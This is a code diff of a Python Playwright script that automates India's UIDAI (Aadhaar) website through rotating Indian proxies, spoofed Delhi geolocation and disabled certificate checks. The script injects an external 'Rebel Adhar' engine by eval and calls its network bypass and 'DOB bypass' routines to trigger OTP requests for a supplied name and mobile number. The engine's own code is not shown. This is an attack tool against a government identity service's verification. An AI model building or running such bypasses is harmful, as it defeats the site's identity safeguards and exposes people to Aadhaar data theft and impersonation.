@@ -1,4 +1,4 @@
-"""Playwright — UIDAI turbo + live logs."""
+"""Playwright — classic 8-step UIDAI load."""
 
 from __future__ import annotations
 
@@ -11,7 +11,7 @@ from typing import Any
 
 from playwright.async_api import Browser, Page, Playwright, async_playwright
 
-from proxy_india import check_proxy, format_proxy_line
+from proxy_india import check_proxy, format_proxy_line, proxy_list_from_env
 
 log = logging.getLogger('uidai-browser')
 
@@ -21,6 +21,7 @@ MOBILE_UA = (
     'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 '
     '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
 )
+TOTAL_STEPS = 8
 StepCb = Callable[[int, int, str], Awaitable[None]]
 LogCb = Callable[[str], Awaitable[None]]
 
@@ -53,8 +54,9 @@ class UidaiBrowserSession:
         self.name = ''
         self.mobile = ''
         self.last_logs: list[dict[str, Any]] = []
+        self.proxy_info: dict[str, Any] = {}
         self.proxy_label = ''
-        self._tried: list[str] = []
+        self._proxy_candidates: list[str] = []
 
     @property
     def page(self) -> Page:
@@ -62,38 +64,48 @@ class UidaiBrowserSession:
             raise RuntimeError('Browser not started')
         return self._page
 
-    async def _step(self, n: int, total: int, msg: str) -> None:
-        await self._log(f'STEP {n}/{total}: {msg}')
+    async def _step(self, n: int, msg: str) -> None:
+        log.info('STEP %s/%s: %s', n, TOTAL_STEPS, msg)
         if self._on_step:
-            await self._on_step(n, total, msg)
+            await self._on_step(n, TOTAL_STEPS, msg)
 
     async def _log(self, msg: str) -> None:
         log.info(msg)
-        if self._on_log:
-            await self._on_log(msg)
 
-    def _attach_page_logs(self, page: Page) -> None:
-        session = self
-
-        def push(text: str) -> None:
-            log.info(text)
-            if not session._on_log:
-                return
-            try:
-                asyncio.get_running_loop().create_task(session._on_log(text))
-            except RuntimeError:
-                pass
-
-        page.on('console', lambda m: push(f'[browser] {m.type}: {m.text[:150]}'))
-        page.on('pageerror', lambda e: push(f'[error] {str(e)[:150]}'))
-        page.on('requestfailed', lambda r: push(f'[net] fail {r.url[:60]}'))
-
-    def _pick_proxy(self) -> str | None:
+    def _build_proxy_candidates(self) -> list[str]:
         if self.proxy and self.proxy.lower() not in ('auto', 'india'):
-            return self.proxy
+            return [self.proxy]
         if not self.auto_india_proxy:
+            return []
+        seen: set[str] = set()
+        out: list[str] = []
+        for p in [FAST_PROXY, *proxy_list_from_env()]:
+            if p and p not in seen:
+                seen.add(p)
+                out.append(p)
+        return out[:5]
+
+    async def _resolve_proxy(self) -> str | None:
+        self._proxy_candidates = self._build_proxy_candidates()
+        if not self._proxy_candidates:
+            self.proxy_label = '⚠️ Direct'
+            await self._step(1, 'Bina proxy — direct connect')
             return None
-        return FAST_PROXY
+
+        for proxy in self._proxy_candidates:
+            try:
+                info = await asyncio.to_thread(check_proxy, proxy, 4)
+                if info.get('countryCode') != 'IN':
+                    continue
+                self.proxy = proxy
+                self.proxy_info = info
+                self.proxy_label = format_proxy_line(info, proxy)
+                await self._step(1, f'VPN connected — {self.proxy_label}')
+                return proxy
+            except Exception as e:
+                log.warning('proxy %s fail: %s', proxy, e)
+
+        raise RuntimeError('Koi Indian proxy kaam nahi kiya')
 
     async def _block_heavy(self, route) -> None:
         url = route.request.url.lower()
@@ -110,7 +122,6 @@ class UidaiBrowserSession:
     async def _launch(self, proxy: str | None) -> None:
         if self._browser:
             await self.close()
-        await self._log(f'Chromium launch… proxy={proxy or "direct"}')
         self._pw = await async_playwright().start()
         opts: dict[str, Any] = {
             'headless': True,
@@ -124,46 +135,39 @@ class UidaiBrowserSession:
             user_agent=MOBILE_UA,
             locale='en-IN',
             timezone_id='Asia/Kolkata',
+            geolocation={'latitude': 28.6139, 'longitude': 77.2090},
+            permissions=['geolocation'],
             ignore_https_errors=True,
         )
         await ctx.add_init_script(SKIP_FONTS_JS)
         await ctx.route('**/*', self._block_heavy)
         self._page = await ctx.new_page()
-        self._attach_page_logs(self._page)
-        await self._log('Browser page ready')
 
     async def start(self) -> None:
         if self._browser:
             return
-        await self._step(1, 6, 'VPN + browser start…')
-        proxy = self._pick_proxy()
-        if proxy:
-            self.proxy = proxy
-            self.proxy_label = f'🇮🇳 Bengaluru ({proxy.split("//")[-1]})'
-            await self._log(f'VPN: {self.proxy_label}')
-        else:
-            self.proxy_label = 'Direct'
+        proxy = await self._resolve_proxy()
         await self._launch(proxy)
-        await self._step(2, 6, 'Browser ready')
+        await self._step(2, 'Browser ready — India timezone (Asia/Kolkata)')
 
-    async def _next_proxy(self) -> str | None:
-        alts = [FAST_PROXY, 'http://103.152.112.162:80', 'http://45.67.59.98:80']
-        for p in alts:
-            if p in self._tried:
-                continue
-            self._tried.append(p)
-            try:
-                await self._log(f'Proxy try: {p}')
-                info = await asyncio.wait_for(asyncio.to_thread(check_proxy, p, 3), timeout=4)
-                if info.get('countryCode') == 'IN':
-                    self.proxy = p
-                    self.proxy_label = format_proxy_line(info, p)
-                    await self._log(f'Proxy OK: {self.proxy_label}')
-                    await self._launch(p)
-                    return p
-            except Exception as e:
-                await self._log(f'Proxy fail {p}: {e}')
-        return None
+    async def _rotate_proxy(self) -> bool:
+        if len(self._proxy_candidates) < 2:
+            return False
+        self._proxy_candidates.pop(0)
+        if not self._proxy_candidates:
+            return False
+        proxy = self._proxy_candidates[0]
+        try:
+            info = await asyncio.to_thread(check_proxy, proxy, 4)
+            if info.get('countryCode') != 'IN':
+                return await self._rotate_proxy()
+            self.proxy = proxy
+            self.proxy_info = info
+            self.proxy_label = format_proxy_line(info, proxy)
+            await self._launch(proxy)
+            return True
+        except Exception:
+            return await self._rotate_proxy()
 
     async def close(self) -> None:
         if self._browser:
@@ -178,53 +182,63 @@ class UidaiBrowserSession:
         err: Exception | None = None
         for attempt in range(3):
             try:
-                await self._log(f'Opening UIDAI (try {attempt + 1})…')
-                await self.page.goto(UIDAI_URL, wait_until='commit', timeout=35_000)
+                await self.page.goto(UIDAI_URL, wait_until='commit', timeout=40_000)
                 await self.page.wait_for_selector('input[name="name"]', timeout=18_000)
-                await self._log('UIDAI form loaded ✓')
                 return
             except Exception as e:
                 err = e
-                await self._log(f'Load fail: {str(e)[:100]}')
-                if attempt < 2 and await self._next_proxy():
+                if attempt < 2 and await self._rotate_proxy():
                     continue
         raise RuntimeError(f'UIDAI load fail: {err}')
 
     async def _inject_rebel(self) -> str:
-        await self._log('Rebel engine inject…')
         bundle = self.bundle_path.read_text(encoding='utf-8')
         r = await self.page.evaluate(
             """(code) => {
               if (!window.__rebelPageBridge) { eval(code); }
               try { localStorage.setItem('rebelAdharOn', '1'); } catch(e) {}
               window.postMessage({ rebel: 1, type: 'cmd', cmd: 'boot' }, '*');
-              return window.UidaiRetrieveEngine?.ENGINE_VERSION || '?';
+              return window.UidaiRetrieveEngine?.ENGINE_VERSION || '';
             }""",
             bundle,
         )
-        await self._log(f'Rebel v{r} ON')
-        return str(r)
+        return str(r or '')
 
     async def open_form(self, name: str, mobile: str, on_frame=None) -> bytes:
         self.name = name.strip()
         self.mobile = mobile.strip()
 
-        await self._step(3, 6, 'UIDAI khul rahi hai…')
+        await self._step(3, 'UIDAI site open…')
         await self._goto_uidai()
-        await self._step(4, 6, 'Form load OK')
+        await self._step(3, 'UIDAI page load ho gayi')
 
-        await self._step(5, 6, 'Rebel + fill…')
-        await self._inject_rebel()
+        await self._step(4, 'Form fields wait kar raha hoon…')
+        for _ in range(24):
+            if await self.page.locator('input[name="name"]').count():
+                break
+            await asyncio.sleep(0.4)
+        else:
+            raise RuntimeError('Form load nahi hua')
+        await self._step(4, 'Form mil gaya — naam/mobile fields ready')
+
+        await self._step(5, 'Rebel Adhar engine inject ho raha hai…')
+        ver = await self._inject_rebel()
+        await asyncio.sleep(0.8)
+        suffix = f' (v{ver})' if ver else ''
+        await self._step(5, f'Rebel Adhar ON{suffix}')
+
+        await self._step(6, f'Naam bhara: {self.name}')
         await self.page.fill('input[name="name"]', self.name)
-        await self.page.fill('input[name="mobile"]', self.mobile)
-        await self._log(f'Name={self.name} Mobile={self.mobile}')
 
-        await self._step(6, 6, 'Captcha load…')
-        await self._wait_captcha_image(15)
-        await self._log('Captcha ready ✓')
+        await self._step(7, f'Mobile bhara: {self.mobile}')
+        await self.page.fill('input[name="mobile"]', self.mobile)
+
+        await self._step(8, 'Captcha image load ho rahi hai…')
+        await self._wait_captcha_image(18)
+        await self._step(8, 'Captcha ready')
         return b''
 
-    async def _wait_captcha_image(self, timeout_s: int = 15) -> None:
+    async def _wait_captcha_image(self, timeout_s: int = 18) -> None:
         el = self.page.locator('img[alt*="CAPTCHA" i]').first
         await el.wait_for(state='visible', timeout=timeout_s * 1000)
         for _ in range(timeout_s * 3):
@@ -238,7 +252,6 @@ class UidaiBrowserSession:
         return await el.screenshot(type='png', timeout=8_000)
 
     async def refresh_captcha(self) -> bytes:
-        await self._log('Captcha refresh…')
         btn = self.page.locator('button[aria-label*="refresh" i]').first
         if await btn.count():
             await btn.click(timeout=2000)
@@ -253,19 +266,18 @@ class UidaiBrowserSession:
         fn = on_step or self._on_step
 
         async def s(n: int, msg: str) -> None:
-            await self._log(msg)
             if fn:
                 await fn(n, 4, msg)
 
-        await s(1, f'Captcha fill: {captcha}')
+        await s(1, 'Captcha sync + DOB bypass…')
         await self.page.fill('input[name="captcha"]', captcha)
-        await s(2, 'DOB bypass + Send OTP…')
+        await s(2, 'Send OTP tap…')
         result = await self.page.evaluate(
             """async (cap) => {
               const E = window.UidaiRetrieveEngine;
               if (!E) return { ok: false, logs: [], version: '?' };
               const logs = [];
-              const log = (l, m, d) => { logs.push({ l, m, d }); console.log('[rebel]', m); };
+              const log = (l, m, d) => logs.push({ l, m, d });
               E.installNetworkBypass({ log, enabled: () => true });
               E.neutralizeReactDob('#tg', log);
               E.syncReactInputs(log);
@@ -274,24 +286,17 @@ class UidaiBrowserSession:
               const inp = document.querySelector('input[name="captcha"]');
               if (inp) E.setReactInputValue(inp, cap, log);
               E.getReactProps(E.findOtpButton())?.onClick?.({});
-              await new Promise((r) => setTimeout(r, 4500));
+              await new Promise((r) => setTimeout(r, 5000));
               return { ok: true, logs, version: E.ENGINE_VERSION };
             }""",
             captcha,
         )
         self.last_logs = result.get('logs') or []
-        for item in self.last_logs:
-            m = item.get('m') or ''
-            d = item.get('d')
-            extra = f' {json.dumps(d)}' if d is not None else ''
-            await self._log(f'[engine] {m}{extra}')
-
-        summary = self._summarize_logs(self.last_logs)
-        await s(3, 'UIDAI jawab aaya')
-        await s(4, 'Done')
+        await s(3, 'UIDAI server jawab aaya')
+        await s(4, 'OTP request complete')
         return {
             'captcha': captcha,
-            'summary': summary,
+            'summary': self._summarize_logs(self.last_logs),
             'logs': self.last_logs,
             'version': result.get('version'),
             'proxy_label': self.proxy_label,
